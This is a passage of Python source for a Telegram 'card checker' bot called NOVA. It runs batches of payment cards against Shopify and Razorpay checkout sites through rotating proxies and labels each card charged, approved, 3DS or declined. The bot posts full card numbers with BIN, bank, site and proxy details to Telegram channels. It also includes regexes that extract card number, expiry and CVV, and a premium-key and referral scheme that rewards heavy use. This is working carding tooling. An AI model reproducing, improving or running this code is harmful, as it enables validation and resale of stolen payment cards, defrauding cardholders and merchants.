                await status_msg.edit(pe(
                    f"💎 <b>{bs('Testing')}</b> [{checked}/{len(to_test)}]\n"
                    f"✅ <code>{len(alive)}</code> | ❌ <code>{dead}</code> | "
                    f"🔌 <code>{proxy_err}</code> | 💰 <code>{over}</code>"
                ), parse_mode='html', link_preview=False)
            except Exception:
                pass

        total_checked = proxy_err + dead + over + len(alive) + unknown
        majority_proxy = (total_checked > 0 and proxy_err >= total_checked)
        if (not wipe) and (proxy_err > 0) and (len(alive) == 0) and (over == 0) and majority_proxy:
            return await status_msg.edit(pe(
                f"🛑 <b>{bs('All requests failed at proxy layer')}</b>\n{SEP}\n"
                f"🔌 {bs('Proxy errors')}: <code>{proxy_err}</code>\n"
                f"❌ {bs('Dead')}: <code>{dead}</code>\n"
                f"💡 {bs('Replace proxies and retry')}"
            ), parse_mode='html', link_preview=False)

        if wipe:
            save_sites(alive)
        elif alive and existing is not None:
            save_sites(list(existing) + alive)

        await status_msg.edit(pe(
            f"✅ <b>{bs('Site check complete')}</b>\n{SEP}\n"
            f"📥 {bs('Received')}: <code>{initial_sites_count}</code>\n"
            f"✅ {bs('Alive')}: <code>{len(alive)}</code>\n"
            f"❌ {bs('Dead')}: <code>{dead}</code>\n"
            f"💰 {bs('Over threshold')}: <code>{over}</code>\n"
            f"🔌 {bs('Proxy errors')}: <code>{proxy_err}</code>\n"
            f"📁 {bs('Final sites.txt')}: <code>{len(load_sites())}</code>"
        ), parse_mode='html', link_preview=False)
    except Exception as e:
        await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"),
                               parse_mode='html')
    finally:
        cleanup_user_sem(uid)


# =============================================================================
# SECTION 36 — HIT DM + CHANNEL
# =============================================================================
async def send_realtime_hit(user_id: int, result: dict, hit_type: str,
                            user_name: str, gateway_type: str = "Shopify",
                            video_path: str = None):
    bin_tuple = await get_bin_info(result.get('card', '').split('|')[0])
    status = (result.get('status') or 'Dead').upper()
    text = format_realtime_hit(result, gateway_type, bin_tuple)

    if status == "CHARGED":
        text = pe(f"📌 <b>{bs('PINNED HIT — CHARGED')}</b>\n{text}")

    video_path = video_path or _pick_hit_video()
    try:
        sent = None
        if video_path and os.path.exists(video_path):
            sent = await send_file_entities(user_id, video_path, text,
                                            buttons=HIT_BUTTON, supports_streaming=True)
        if sent is None:
            sent = await send_entities(user_id, text, buttons=HIT_BUTTON)
        if status == "CHARGED" and sent:
            try:
                await client_instance.pin_message(user_id, sent.id, notify=False)
            except Exception:
                pass
    except Exception as e:
        log_system("HIT_DM", f"user {user_id}: {e}", "error")


async def send_hit_to_channel(card: str, status: str, response: str,
                              gateway: str, price: str = "-",
                              user_mention: str = None, user_id: int = None,
                              gateway_type: str = "Shopify",
                              site: str = None, proxy_used: str = None,
                              video_path: str = None):
    status_up = (status or '').upper()
    if status_up not in ("CHARGED", "APPROVED", "3DS"):
        return

    mention = user_mention or "User"
    video_path = video_path or _pick_hit_video()

    if HIT_CHANNEL_ID and HIT_CHANNEL_ID != -1000000000000:
        try:
            body = pe(f"""⭐ <b>{bs('HIT')}</b> ➛ <b>{bs(status_up)}</b>
{SEP}
⊀ {bs('Gateway')} ━ <code>{gateway}</code>
{bs('Response')} ━ <code>{(response or '')[:45]}</code>
{bs('Price')} ━ <code>{price}</code>
{SEP}
{bs('User')} ➛ {mention}
{SEP}
{DEV_LINE}""")

            sent = None
            if video_path and os.path.exists(video_path):
                try:
                    sent = await send_file_entities(
                        HIT_CHANNEL_ID, video_path, body,
                        buttons=HIT_BUTTON, supports_streaming=True)
                except Exception as e:
                    log_system("HIT_MAIN", f"video failed: {e}", "error")
            if sent is None:
                sent = await send_entities(HIT_CHANNEL_ID, body, buttons=HIT_BUTTON)
            if status_up == "CHARGED" and sent:
                try:
                    await client_instance.pin_message(HIT_CHANNEL_ID, sent.id)
                except Exception:
                    pass
        except Exception as e:
            log_system("HIT_MAIN", f"failed: {e}", "error")

    if CHARGED_ONLY_CHANNEL_ID and CHARGED_ONLY_CHANNEL_ID != -1000000000000:
        try:
            bin_tuple = await get_bin_info(card.split('|')[0])
            brand, typ, level, bank, country, flag = bin_tuple
            bin_disp = f"{brand} - {typ} - {level}" if brand != '-' else "N/A"
            bank_disp = bank if bank != '-' else "N/A"
            country_disp = f"{country} {flag}" if country != '-' else "N/A"
            site_disp = site or "N/A"
            uid_disp = f"<code>{user_id}</code>" if user_id else "N/A"
            proxy_line = f"\n{bs('Proxy')} ━ <code>{proxy_used}</code>" if proxy_used else ""
            date_full = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
            status_label = f"{PE} {bs(status_up)}"

            body = pe(f"""{status_label}
{SEP}
⊀ {bs('Card')}
⤷ <code>{card}</code>
{bs('Gateway')} ━ <code>{gateway}</code>
{bs('Site')} ━ <code>{site_disp}</code>
{bs('Response')} ━ <code>{response}</code>
{bs('Price')} ━ <code>{price}</code>{proxy_line}
{SEP}
{bs('BIN')} ━ <code>{bin_disp}</code>
{bs('Bank')} ━ <code>{bank_disp}</code>
{bs('Country')} ━ <code>{country_disp}</code>
{SEP}
{bs('User')} ➛ {mention} ({uid_disp})
{bs('Date')} ➛ {date_full}
{SEP}
{DEV_LINE}""")

            sent = None
            if video_path and os.path.exists(video_path):
                try:
                    sent = await send_file_entities(
                        CHARGED_ONLY_CHANNEL_ID, video_path, body,
                        buttons=HIT_BUTTON, supports_streaming=True)
                except Exception as e:
                    log_system("HIT_FULL", f"video failed: {e}", "error")
            if sent is None:
                sent = await send_entities(CHARGED_ONLY_CHANNEL_ID, body, buttons=HIT_BUTTON)
            if status_up == "CHARGED" and sent:
                try:
                    await client_instance.pin_message(CHARGED_ONLY_CHANNEL_ID, sent.id)
                except Exception:
                    pass
        except Exception as e:
            log_system("HIT_FULL", f"failed: {e}", "error")


# =============================================================================
# SECTION 37 — REDEEM LOG
# =============================================================================
async def send_redeem_log(user_id: int, key: str, status: str, details: str = ""):
    if not REDEEM_LOG_CHANNEL_ID or REDEEM_LOG_CHANNEL_ID == -1000000000000:
        return
    try:
        sender = await client_instance.get_entity(user_id)
        username = f"@{sender.username}" if sender.username else f"User {user_id}"
    except Exception:
        username = f"User {user_id}"

    keys_data = load_keys()
    entry = keys_data.get(key, {})
    hours = entry.get("hours", DEFAULT_KEY_HOURS)
    try:
        hours = int(hours)
    except Exception:
        hours = DEFAULT_KEY_HOURS

    if hours < 24:
        plan_disp = f"{hours}.0h"
        exp_mins = hours * 60 - 1
        exp_h, exp_m = exp_mins // 60, exp_mins % 60
        exp_disp = f"{exp_h}h {exp_m:02d}m"
    else:
        days = hours // 24
        plan_disp = f"{days}.0d"
        exp_disp = f"{days - 1}d 23h 59m"

    ok = status.startswith("✅")
    emoji = "✅" if ok else "❌"
    body = pe(f"""{emoji} <b>{bs('Redeem Log')}</b> ➛ <b>{bs(status)}</b>
{SEP}
👤 <b>{bs('User')}</b> ⌁ {username} ⌁ <code>{user_id}</code>
🔑 <b>{bs('Key')}</b> ⌁ <code>{key}</code>
💎 <b>{bs('Plan')}</b> ⌁ <code>{plan_disp}</code>
⏰ <b>{bs('Expires')}</b> ⌁ <code>{exp_disp}</code>
📝 <b>{bs('Details')}</b> ⌁ <i>{details or '-'}</i>
{SEP}
{DEV_LINE}""")

    try:
        await send_entities(REDEEM_LOG_CHANNEL_ID, body, buttons=HIT_BUTTON)
    except Exception as e:
        log_system("REDEEM_LOG", f"send failed: {e}", "error")


# =============================================================================
# SECTION 38 — PROGRESS UI + RESULT FILES
# =============================================================================
def _fmt_eta(seconds: float) -> str:
    if seconds <= 0 or seconds > 86400:
        return "—"
    seconds = int(seconds)
    h, m, s = seconds // 3600, (seconds % 3600) // 60, seconds % 60
    if h:
        return f"{h}h {m:02d}m"
    if m:
        return f"{m}m {s:02d}s"
    return f"{s}s"


def _build_bar(pct: int, length: int = 16) -> str:
    pct = max(0, min(100, pct))
    filled = int(round(length * pct / 100))
    return "▰" * filled + "▱" * (length - filled)


async def update_progress(user_id: int, message_id: int, results: dict,
                          current_checked: int, gateway_type: str = "Shopify"):
    total = results.get('total', 1) or 1
    checked = results.get('checked', 0)
    remaining = max(total - checked, 0)
    elapsed = max(0.0, time.time() - results.get('start_time', time.time()))
    h, m, s = int(elapsed) // 3600, (int(elapsed) % 3600) // 60, int(elapsed) % 60
    pct = int((checked / total) * 100) if total else 0
    bar = _build_bar(pct, 16)
    last_card = (results.get('last_card') or 'None')
    last_resp = (results.get('last_response') or 'Waiting...')[:22]
    last_price = (results.get('last_price') or '-')[:8]
    n_charged = len(results.get('charged', []))
    n_approved = len(results.get('approved', []))
    n_3ds = len(results.get('3ds', []))
    n_dead = len(results.get('dead', []))
    n_errors = len(results.get('errors', []))
    hits = n_charged + n_approved + n_3ds
    hit_rate = (hits / checked * 100.0) if checked > 0 else 0.0
    if checked > 0 and remaining > 0:
        rate = checked / elapsed if elapsed > 0 else 0
        eta_sec = (remaining / rate) if rate > 0 else 0
        eta_str = _fmt_eta(eta_sec)
    elif remaining == 0:
        eta_str = "done"
    else:
        eta_str = "—"
    cps = (checked / elapsed) if elapsed > 0 else 0.0

    text = pe(f"""💳 {bs('Card')}: <code>{last_card}</code>
📝 {bs('Response')}: <code>{last_resp}</code>
💰 {bs('Price')}: <code>{last_price}</code>
{SEP}
{bar}  <b>{pct}%</b>
{SEP}
🥇 {bs('Charged')}: {n_charged}   🥈 {bs('Approved')}: {n_approved}
🥉 {bs('3DS')}: {n_3ds}   🥔 {bs('Declined')}: {n_dead}
🧨 {bs('Errors')}: {n_errors}
{SEP}
📊 {checked}/{total}  ━  ⏳ {bs('Left')}: {remaining}
🎯 {bs('Hit-rate')}: <b>{hit_rate:.2f}%</b>  ━  ⚡ {cps:.1f}/s
⏱️ {h:02d}:{m:02d}:{s:02d}  ━  🕐 {bs('ETA')}: {eta_str}
""")

    prefix = "razorpay" if gateway_type.lower() == "razorpay" else "shopify"
    buttons = [
        [pbtn(f"🥇 {bs('Charged')} {n_charged}",
              data=f"{prefix}_export_charged:{user_id}", style="success", icon="🥇"),
         pbtn(f"🥈 {bs('Approved')} {n_approved}",
              data=f"{prefix}_export_approved:{user_id}", style="primary", icon="🥈")],
        [pbtn(f"🥉 {bs('3DS')} {n_3ds}",
              data=f"{prefix}_export_3ds:{user_id}", style="primary", icon="🥉"),
         pbtn(f"🧨 {bs('Errors')} {n_errors}",
              data=f"{prefix}_export_errors:{user_id}", style="danger", icon="🧨")],
        [pbtn(f"⛔ {bs('Stop')}", data=f"stop_{user_id}", style="danger", icon="⛔")],
    ]
    try:
        text_clean, ents = build_entities(text)
        await client_instance.edit_message(
            user_id, message_id, text_clean,
            formatting_entities=ents,
            buttons=buttons, link_preview=False)
    except Exception:
        pass


def _write_result_file(fname: str, title: str, items: list, gateway: str = "Shopify"):
    try:
        with open(fname, 'w', encoding='utf-8') as f:
            f.write(f"{title}\n")
            f.write(f"Gateway  : {gateway}\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total    : {len(items)}\n")
            f.write("=" * 50 + "\n\n")
            if not items:
                f.write("(no cards in this category)\n")
            else:
                for i, item in enumerate(items, 1):
                    card = item.get('card', '-')
                    resp = (item.get('message') or item.get('Response') or '')[:120]
                    gw = item.get('gateway') or item.get('Gateway') or gateway
                    price = item.get('price') or item.get('Price') or '-'
                    site = item.get('site', '-') or '-'
                    code = item.get('status_code', '-') or '-'
                    f.write(f"[{i:>4}] {card}\n")
                    f.write(f"        Response : {resp}\n")
                    f.write(f"        Gateway  : {gw}\n")
                    f.write(f"        Price    : {price}\n")
                    f.write(f"        Site     : {site}\n")
                    f.write(f"        Code     : {code}\n")
                    f.write("-" * 40 + "\n")
            f.write(f"\nEnd of {title} — {len(items)} card(s)\n")
    except Exception as e:
        log_system("EXPORT", f"write {fname} failed: {e}", "error")


async def send_final_results(user_id: int, results: dict, gateway_type: str = "Shopify"):
    elapsed = int(time.time() - results.get('start_time', time.time()))
    h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    time_fmt = f"{h}h {m}m {s}s" if h else f"{m}m {s}s" if m else f"{s}s"

    charged = results.get('charged', [])
    approved = results.get('approved', [])
    threeds = results.get('3ds', [])
    dead = results.get('dead', [])
    errors = results.get('errors', [])

    n_charged = len(charged)
    n_approved = len(approved)
    n_3ds = len(threeds)
    n_dead = len(dead)
    n_errors = len(errors)
    total = results.get('total', 0) or 1
    hit_rate = ((n_charged + n_approved + n_3ds) / total * 100.0) if total else 0.0

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    prefix = "NOVA"

    summary = pe(f"""✅ <b>{bs('Check Complete')}</b>
{SEP}
📊 <b>{bs('Results')}</b> ({gateway_type}):
   ┣ 🥇 {bs('Charged')}:  {n_charged}
   ┣ 🥈 {bs('Approved')}: {n_approved}
   ┣ 🥉 {bs('3DS')}:      {n_3ds}
   ┣ 🥔 {bs('Declined')}: {n_dead}
   ┣ 🧨 {bs('Errors')}:   {n_errors}
   ┗ 📊 {bs('Total')}:    {results.get('total', 0)}
{SEP}
🎯 {bs('Hit-rate')}: <b>{hit_rate:.2f}%</b>
⏱️ {bs('Time')}: {time_fmt}
{SEP}
📁 {bs('5 files below')} ⬇️""")
    try:
        await send_entities(user_id, summary)
    except Exception as e:
        log_system("RESULT", f"summary send failed: {e}", "error")

    categories = [
        ("CHARGED",  charged,  "🥇", "success"),
        ("APPROVED", approved, "🥈", "primary"),
        ("3DS",      threeds,  "🥉", "primary"),
        ("DECLINED", dead,     "🥔", "danger"),
        ("ERRORS",   errors,   "🧨", "danger"),
    ]
    for cat_name, items, emoji, style in categories:
        fname = f"{prefix}_{cat_name}_{user_id}_{timestamp}.txt"
        _write_result_file(fname, f"{cat_name} CARDS", items, gateway_type)
        caption = pe(f"{emoji} <b>{bs(cat_name)}</b> — <code>{len(items)}</code>")
        try:
            await send_file_entities(user_id, fname, caption)
        except Exception as e:
            log_system("RESULT", f"send {cat_name} file failed: {e}", "error")
        try:
            os.remove(fname)
        except Exception:
            pass


# =============================================================================
# SECTION 39 — FREE GATE
# =============================================================================
async def _check_free_or_premium(event, uid: int) -> bool:
    if uid in ADMIN_ID:
        return True
    if is_premium(uid):
        return True
    is_group = event.chat_id != uid
    if not is_group:
        await send_group_only(event)
        return False
    used = get_free_usage(uid)
    if used >= FREE_DAILY_LIMIT:
        await styled_reply(event, pe(f"""💎 <b>{bs('Daily limit')}</b>
{SEP}
💎 {bs('Used')}: <code>{used}/{FREE_DAILY_LIMIT}</code>
💎 <i>{bs('Redeem a key or contact admin')}</i>"""),
            buttons=[[pbtn(bs("📩 Contact"), url=f"https://t.me/{OWNER_TAG.lstrip('@')}",
                           style="success", icon="📩")]])
        return False
    left = free_cooldown_left(uid)
    if left > 0:
        await styled_reply(event, pe(f"⚠️ <b>{bs('Wait')} {left}s</b>"))
        return False
    return True


def _consume_free(uid: int):
    if uid in ADMIN_ID or is_premium(uid):
        return
    set_free_last(uid)
    inc_free_usage(uid)


# =============================================================================
# SECTION 40 — MILESTONE / STREAK PAYOUT
# =============================================================================
async def _process_milestone_payout(user_id: int):
    try:
        info = maybe_pay_milestone(user_id)
        if not info:
            return
        inviter_id = info["inviter_id"]
        hours = info["hours"]
        cc = info["cc_limit"]
        total = info["total_confirmed"]
        paid = info["milestones_paid"]
        nxt = info["next_milestone_at"]
        try:
            await send_entities(inviter_id, pe(
                f"🎉 <b>{bs('Milestone Unlocked!')}</b>\n{SEP}\n"
                f"👥 {bs('Confirmed referrals')}: <code>{total}</code>\n"
                f"🎁 {bs('Reward')}: <code>+{hours}h Premium</code>\n"
                f"💳 {bs('CC limit')}: <code>{cc}</code>\n"
                f"🏅 {bs('Milestones earned')}: <code>{paid}</code>\n"
                f"🎯 {bs('Next at')}: <code>{nxt}</code> referrals\n{SEP}\n"
                f"🚀 {bs('Keep inviting for more!')}"))
        except Exception:
            pass
        try:
            await send_entities(user_id, pe(
                f"🎁 <b>{bs('Welcome Bonus!')}</b>\n{SEP}\n"
                f"💎 {bs('Your first check activated a referral')}\n"
                f"🚀 {bs('Enjoy NOVA Premium features!')}"))
        except Exception:
            pass
        log_system("REFERRAL", f"MILESTONE paid inviter={inviter_id} total={total} +{hours}h cc={cc}")
    except Exception as e:
        log_system("REFERRAL", f"milestone error: {e}", "error")


async def _process_streak_update(user_id: int):
    try:
        info = update_streak(user_id)
        r = info.get("reward")
        if not r:
            return
        try:
            await send_entities(user_id, pe(
                f"🔥 <b>{bs('Streak Milestone!')}</b>\n{SEP}\n"
                f"📅 <b>{bs('Day')} {r['day']}</b> {bs('streak unlocked')}\n"
                f"🎁 <b>+{r['hours']}h Premium</b> {bs('added')}\n"
                f"🔥 {bs('Current streak')}: <code>{info['current']}</code>\n"
                f"🏆 {bs('Best')}: <code>{info['best']}</code>\n{SEP}\n"
                f"💡 {bs('Keep checking daily!')}"))
        except Exception:
            pass
        log_system("STREAK", f"user={user_id} day={r['day']} +{r['hours']}h")
    except Exception as e:
        log_system("STREAK", f"update error: {e}", "error")


async def _process_referral_payout(user_id: int):
    await _process_milestone_payout(user_id)


# =============================================================================
# SECTION 41 — UTILITIES
# =============================================================================
def extract_cc(text: str) -> list:
    if not text:
        return []
    cards = []
    for c, m, y, cv in re.findall(
        r'(\d{15,16})[\s|/\\:]+(\d{1,2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2:
            y = '20' + y
        cards.append(f"{c}|{m.zfill(2)}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(
            r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text):
            cards.append(f"{c}|{m}|{y}|{cv}")
    return list(dict.fromkeys(cards))


def is_valid_url_or_domain(url: str) -> bool:
    d = url.lower()
    if d.startswith(('http://', 'https://')):
        try:
            d = urlparse(url).netloc
        except Exception:
            return False
    return bool(re.match(
        r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$',
        d))


def normalize_site_url(url: str) -> str:
    url = url.strip().lower()
    url = re.sub(r'^https?://', '', url).rstrip('/')
    if url.startswith('www.'):
        url = url[4:]
    if '/' in url:
        url = url.split('/')[0]
    return url


def normalize_rz_url(url: str) -> str:
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url.rstrip('/')


def extract_urls(text: str) -> list:
    seen, result = set(), []
    for line in text.split('\n'):
        line = line.strip()
        if not line:
            continue
        m = re.match(r'(https?://[^\s{(]+)', line)
        if m:
            n = normalize_site_url(m.group(1).rstrip('/'))
            if n and is_valid_url_or_domain(n) and n not in seen:
                seen.add(n); result.append(n)
            continue
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].split('{')[0].strip()
        if cleaned:
            n = normalize_site_url(cleaned)
            if n and is_valid_url_or_domain(n) and n not in seen:
                seen.add(n); result.append(n)
    return result


def extract_rz_urls(text: str) -> list:
    seen, result = set(), []
    for line in text.split('\n'):
        line = line.strip()
        if not line:
            continue
        m = re.match(r'(https?://[^\s{(]+)', line)
        if m:
            n = normalize_rz_url(m.group(1))
            if n and n not in seen:
                seen.add(n); result.append(n)
            continue
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].split('{')[0].strip()
        if cleaned:
            n = normalize_rz_url(cleaned)
            if n and n not in seen:
                seen.add(n); result.append(n)
    return result


def parse_proxy_format(proxy: str):
    proxy = proxy.strip()
    pt = 'http'
    m = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if m:
        pt, proxy = m.group(1).lower(), m.group(2)
    h = p = u = pw = ''
    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if m:
        u, pw, h, p = m.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        ph, pp, pu, ppw = m2.groups()
        try:
            if 0 < int(pp) <= 65535:
                h, p, u, pw = ph, pp, pu, ppw
        except Exception:
            return None
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        m3 = re.match(r'^([^:@]+):(\d+)$', proxy)
        h, p = m3.groups()
    else:
        return None
    if not h or not p:
        return None
    try:
        if not (0 < int(p) <= 65535):
            return None
    except Exception:
        return None
    return {'ip': h, 'port': p, 'username': u or None,
            'password': pw or None, 'type': pt}


def proxy_to_url(proxy: str) -> str:
    p = parse_proxy_format(proxy)
    if not p:
        return f'http://{proxy}'
    if p['username'] and p['password']:
        return f"{p['type']}://{p['username']}:{p['password']}@{p['ip']}:{p['port']}"
    return f"{p['type']}://{p['ip']}:{p['port']}"


def is_site_error(t):
    if not t:
        return False
    tl = str(t).lower().strip()
    dead_markers = [
        "shop not found", "store not found", "site not found",
        "invalid site", "invalid store", "no such shop",
        "domain not found", "could not resolve", "dns error",
        "store is unavailable", "shop is unavailable",
        "this store is unavailable", "this shop is currently unavailable",
        "currently unavailable", "store closed", "shop closed",
        "storefront is password protected", "password protected",
    ]
    return any(k in tl for k in dead_markers)


def is_proxy_error(t):
    if not t:
        return False
    tl = str(t).lower()
    keys = ["proxy", "407", "tunnel", "connection reset", "socks",
            "proxy_required", "proxy required", "proxy_invalid"]
    return any(k in tl for k in keys)


def is_rz_retry_error(t):
    if not t:
        return True
    tl = str(t).lower()
    keys = ["timeout", "retry", "error", "failed", "502", "503", "504"]
    return any(k in tl for k in keys)


# =============================================================================
# SECTION 42 — HTTP SESSIONS
# =============================================================================
_GLOBAL_HTTP = None
_GLOBAL_BIN  = None
_GLOBAL_PROXY = None


async def get_http_session():
    global _GLOBAL_HTTP
    if _GLOBAL_HTTP is None or _GLOBAL_HTTP.closed:
        _GLOBAL_HTTP = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=45, connect=10),
            connector=aiohttp.TCPConnector(
                limit=500, limit_per_host=200,
                ttl_dns_cache=600, use_dns_cache=True,
                enable_cleanup_closed=True,
            ),
        )
    return _GLOBAL_HTTP


async def get_bin_session():
    global _GLOBAL_BIN
    if _GLOBAL_BIN is None or _GLOBAL_BIN.closed:
        _GLOBAL_BIN = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=10),
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300),
        )
    return _GLOBAL_BIN


async def get_proxy_session():
    global _GLOBAL_PROXY
    if _GLOBAL_PROXY is None or _GLOBAL_PROXY.closed:
        _GLOBAL_PROXY = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30, connect=20),
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300),
        )
    return _GLOBAL_PROXY


# =============================================================================
# SECTION 43 — PER-USER SEMAPHORES
# =============================================================================
_USER_SEMS = {}


def get_user_sem(uid, t="msp"):
    key = (uid, t)
    sem = _USER_SEMS.get(key)
    if sem is None:
        limits = {
            "sp": SP_PER_USER_WORKERS,
            "msp": MSP_PER_USER_WORKERS,
            "rz": RZ_PER_USER_WORKERS,
            "mrz": MRZ_PER_USER_WORKERS,
            "proxy": PROXY_PER_USER_WORKERS,
            "site": SITE_PER_USER_WORKERS,
            "harvest": HARVEST_PER_USER_WORKERS,
        }
        sem = asyncio.Semaphore(limits.get(t, 20))
        _USER_SEMS[key] = sem
    return sem


def cleanup_user_sem(uid):
    for k in [k for k in list(_USER_SEMS.keys()) if k[0] == uid]:
        _USER_SEMS.pop(k, None)


async def get_user_http_session(uid, purpose="general"):
    return await get_http_session()


async def cleanup_user_http_session(uid, purpose="general"):
    pass


# =============================================================================
# SECTION 44 — SMART ROTATOR
# =============================================================================
class SmartRotator:
    def __init__(self):
        self._sf, self._pf = {}, {}

    def pick_site(self, sites, exclude=None):
        exclude = exclude or set()
        available = [s for s in sites if s not in exclude] or sites
        return random.choice(available) if available else None

    def pick_proxy(self, proxies, exclude=None):
        exclude = exclude or set()
        available = [p for p in proxies if p not in exclude] or proxies
        return random.choice(available) if available else None

    def report_site_ok(self, s):   pass
    def report_site_fail(self, s): pass
    def report_proxy_ok(self, p):  pass
    def report_proxy_fail(self, p): pass


# =============================================================================
# SECTION 45 — BIN LOOKUP
# =============================================================================
_BIN_CACHE = {}


async def get_bin_info_cached(card_number, session):
    cn = card_number[:6] if card_number else ''
    if not cn or len(cn) < 6:
        return ('-', '-', '-', '-', '-', '')
    if cn in _BIN_CACHE:
        return _BIN_CACHE[cn]
    try:
        url = f"https://lookup.binlist.net/{cn}"
        headers = {'Accept-Version': '3'}
        async with session.get(url, headers=headers) as resp:
            if resp.status == 200:
                data = await resp.json(content_type=None)
                scheme = data.get('scheme', '-') or '-'
                typ = data.get('type', '-') or '-'
                brand = data.get('brand', '-') or '-'
                bank = (data.get('bank') or {}).get('name', '-') or '-'
                country = (data.get('country') or {}).get('name', '-') or '-'
                flag = (data.get('country') or {}).get('emoji', '') or ''
                result = (scheme.upper(), typ.upper(), brand.upper(), bank, country, flag)
                _BIN_CACHE[cn] = result
                return result
    except Exception:
        pass
    return ('-', '-', '-', '-', '-', '')


async def get_bin_info(card_number: str):
    return await get_bin_info_cached(card_number, await get_bin_session())


def build_status_text():
    if not PSUTIL_AVAILABLE:
        return pe(f"💎 <b>{bs('Status')}</b>\n{SEP}\n💎 <i>psutil unavailable</i>")
    try:
        cpu = psutil.cpu_percent(interval=0.5)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        uptime_sec = time.time() - BOT_START_TIME
        h, m, s = int(uptime_sec // 3600), int((uptime_sec % 3600) // 60), int(uptime_sec % 60)
        return pe(f"""💎 <b>{bs('System Status')}</b>
{SEP}
💻 CPU: <code>{cpu}%</code>
🧠 RAM: <code>{mem.percent}%</code> ({mem.used // (1024**2)}MB / {mem.total // (1024**2)}MB)
💾 Disk: <code>{disk.percent}%</code>
⏰ Uptime: <code>{h}h {m}m {s}s</code>
{SEP}
🤖 {bs('NOVA Bot Online')}""")
    except Exception as e:
        return pe(f"💎 <b>{bs('Status error')}</b>: <code>{e}</code>")


# =============================================================================
# SECTION 46 — REFERRALS
# =============================================================================
def load_referrals() -> dict:
    data = _read_json(REFERRALS_FILE, None)
    if not isinstance(data, dict):
        data = {"users": {}, "codes": {}}
    data.setdefault("users", {})
    data.setdefault("codes", {})
    return data


def save_referrals(data: dict):
    _write_json(REFERRALS_FILE, data)


def _gen_ref_code(user_id: int) -> str:
    base = f"NOVA{user_id}{time.time()}{random.random()}"
    h = hashlib.sha1(base.encode()).hexdigest().upper()
    return "NOVA" + h[:6]


def get_or_create_ref_code(user_id: int) -> str:
    uid = str(user_id)
    data = load_referrals()
    u = data["users"].get(uid)
    if u and u.get("code"):
        return u["code"]
    code = _gen_ref_code(user_id)
    while code in data["codes"]:
        code = _gen_ref_code(user_id + random.randint(1, 9999999))
    data["users"][uid] = {
        "code": code, "referred_by": None, "referrals": [],
        "pending": [], "rewarded": [], "milestones_paid": 0,
        "total_hours_earned": 0, "total_cc_upgrades": 0,
        "created_at": datetime.now().isoformat(),
    }
    data["codes"][code] = uid
    save_referrals(data)
    return code


def find_user_by_code(code: str):
    data = load_referrals()
    uid = data["codes"].get((code or "").upper().strip())
    return int(uid) if uid else None


def attach_referral(new_user_id: int, ref_code: str) -> bool:
    if not ref_code:
        return False
    inviter_id = find_user_by_code(ref_code)
    if not inviter_id or inviter_id == new_user_id:
        return False
    data = load_referrals()
    new_uid = str(new_user_id)
    inv_uid = str(inviter_id)
    if new_uid in data["users"] and data["users"][new_uid].get("referred_by"):
        return False
    if new_uid not in data["users"]:
        save_referrals(data)
        get_or_create_ref_code(new_user_id)
        data = load_referrals()
    if inv_uid not in data["users"]:
        save_referrals(data)
        get_or_create_ref_code(inviter_id)
        data = load_referrals()
    data["users"][new_uid]["referred_by"] = inviter_id
    inviter = data["users"][inv_uid]
    if new_user_id not in inviter.get("pending", []):
        inviter.setdefault("pending", []).append(new_user_id)
    save_referrals(data)
    return True


def _grant_milestone(user_id: int, hours: int, cc_limit: int):
    if user_id in ADMIN_ID:
        return
    data = load_premium_users()
    uid = str(user_id)
    now = datetime.now()
    entry = data.get(uid)
    if entry is None:
        return
    if isinstance(entry, dict):
        exp = entry.get("expiry")
        base_ts = now.timestamp()
        if exp:
            try:
                base_ts = max(float(exp), now.timestamp())
            except Exception:
                pass
        entry["expiry"] = base_ts + hours * 3600
        old_cc = int(entry.get("cc_limit", 0))
        entry["cc_limit"] = max(old_cc, cc_limit)
        entry["milestone_bonus_hours"] = int(entry.get("milestone_bonus_hours", 0)) + hours
        entry.setdefault("activated_at", now.isoformat())
    else:
        try:
            base_ts = max(float(entry), now.timestamp())
        except Exception:
            base_ts = now.timestamp()
        data[uid] = {
            "expiry": base_ts + hours * 3600,
            "cc_limit": cc_limit,
            "milestone_bonus_hours": hours,
            "activated_at": now.isoformat(),
        }
    save_premium_users(data)


def maybe_pay_milestone(new_user_id: int):
    if REFERRAL_MIN_CHECKS > 0 and count_successful_checks(new_user_id) < REFERRAL_MIN_CHECKS:
        return None
    data = load_referrals()
    new_uid = str(new_user_id)
    u = data["users"].get(new_uid)
    if not u:
        return None
    inviter_id = u.get("referred_by")
    if not inviter_id:
        return None
    inv_uid = str(inviter_id)
    inviter = data["users"].get(inv_uid)
    if not inviter:
        return None
    pending = inviter.get("pending", [])
    rewarded = inviter.get("rewarded", [])
    if new_user_id in rewarded or new_user_id not in pending:
        return None
    inviter["pending"] = [x for x in pending if x != new_user_id]
    inviter.setdefault("rewarded", []).append(new_user_id)
